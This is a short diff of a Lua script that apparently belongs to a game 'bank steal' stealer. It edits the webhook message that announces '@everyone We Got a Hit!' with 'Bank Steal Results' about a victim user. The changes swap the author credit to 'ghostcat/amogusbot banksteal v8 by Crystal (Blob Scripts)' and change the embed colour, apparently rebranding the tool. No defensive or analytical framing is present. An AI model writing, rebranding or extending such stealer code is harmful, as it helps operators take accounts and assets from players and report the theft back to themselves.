@@ -250,9 +250,9 @@ local data = {
   ["content"] = "@everyone We Got a Hit!",
 ["embeds"] = {{
 ["title"] = "__**Bank Steal Results**__",
-["description"] = "(Made by One Love)",
+["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
 ["type"] = "rich",
-["color"] = tonumber(0x7269da)
+["color"] = tonumber(0x0E980E),
 ["fields"] = {
                {
 ["name"] = "__User__",
@@ -313,9 +313,9 @@ local data = {
   ["content"] = "@everyone We Got a Hit!",
 ["embeds"] = {{
 ["title"] = "__**Bank Steal Results**__",
-["description"] = "(Made by One Love)",
+["description"] = "(ghostcat/amogusbot banksteal v8 by Crystal (Blob Scripts)!)",
 ["type"] = "rich",
-["color"] = tonumber(0x7269da),
+["color"] = tonumber(0x0E980E),
 ["fields"] = {
                {
 ["name"] = "__User__",
